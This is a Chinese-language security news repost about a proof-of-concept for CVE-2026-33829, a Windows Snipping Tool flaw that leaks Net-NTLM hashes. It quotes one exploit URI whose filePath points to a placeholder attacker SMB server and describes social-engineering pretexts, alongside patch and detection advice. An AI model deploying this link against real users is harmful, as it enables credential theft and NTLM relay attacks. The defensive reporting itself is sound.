#  Windows 截图工具NTLM哈希泄露漏洞PoC利用代码公开  
 黑白之道   2026-04-23 00:39  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
  
网络安全研究人员已公开针对微软截图工具（Snipping Tool）新漏洞的概念验证（PoC）利用代码，攻击者可通过诱导用户访问恶意网页，悄无声息地窃取其Net-NTLM凭证哈希值。该漏洞编号为CVE-2026-33829，源于Windows截图工具处理ms-screensketch  
协议架构深度链接URI注册时的缺陷。受影响版本的应用程序会注册该深度链接，该链接接受filePath  
参数。  
## 漏洞利用原理  
  
由于缺乏有效的输入验证，攻击者可提供指向远程攻击者控制SMB服务器的UNC路径，强制建立经过身份验证的SMB连接，并在此过程中捕获受害者的Net-NTLM哈希。Black Arrow安全团队发现并报告了该漏洞，在公开前已与微软协调披露。  
## Windows截图工具PoC详解  
  
利用该漏洞所需技术门槛极低。攻击者仅需托管恶意URL或能自动触发深度链接的HTML页面，并诱使目标访问即可。Black Arrow Security提供的PoC演示了通过浏览器触发单一URI实现攻击：  
```
ms-screensketch:edit?&filePath=\\<attacker-smb-server>\file.png&isTemporary=false&saved=true&source=Toast
```  
  
当受害者打开此链接时，截图工具会启动并静默尝试通过SMB加载远程资源。在此连接尝试过程中，Windows会自动将用户的Net-NTLM认证响应发送至攻击者服务器，暴露的凭证可被离线破解或用于针对内部网络资源的NTLM中继攻击。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6OsicITmwGcFmffgFXnZRghiaiawn1eI0vnyk4WD2khcOD6xwtc4jUCTm0AeN1u7frl636s2zfFAx1UA0QSc4gtZQstfJAlZVgAPs/640?wx_fmt=jpeg&from=appmsg "")  
  
CVE-2026-33829的特别危险之处在于其天然适合社会工程攻击。由于截图工具在利用过程中确实会打开，攻击在视觉上与可信借口完全吻合，例如要求员工裁剪企业壁纸、编辑工牌照片或查看HR文档。攻击者可注册类似snip.example.com  
的域名，提供看似正常的图片URL，在后台静默传递恶意深度链接有效载荷。受害者不会察觉任何异常——截图工具如预期般打开，而NTLM认证在后台透明进行。  
## 补丁发布与时间线  
  
微软已在2026年4月14日的补丁星期二安全更新中修复该漏洞。披露时间线如下：  
- 2026年3月23日——漏洞报告至微软  
  
- 2026年4月14日——微软发布安全补丁  
  
- 2026年4月14日——协调发布公开公告及PoC  
  
运行受影响版本Windows截图工具的企业及个人用户应立即安装2026年4月14日的安全更新。安全团队还应监控内部网络中是否存在指向外部或未知主机的异常出站SMB连接（端口445），这可能是活跃攻击尝试的迹象。无论补丁状态如何，在网络边界阻止出站SMB流量仍是有效的防御措施。  
  
**参考来源：**  
> PoC Exploit Released for Windows Snipping Tool NTLM Hash Leak Vulnerability  
  
  
  
> **文章来源：freebuf**  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
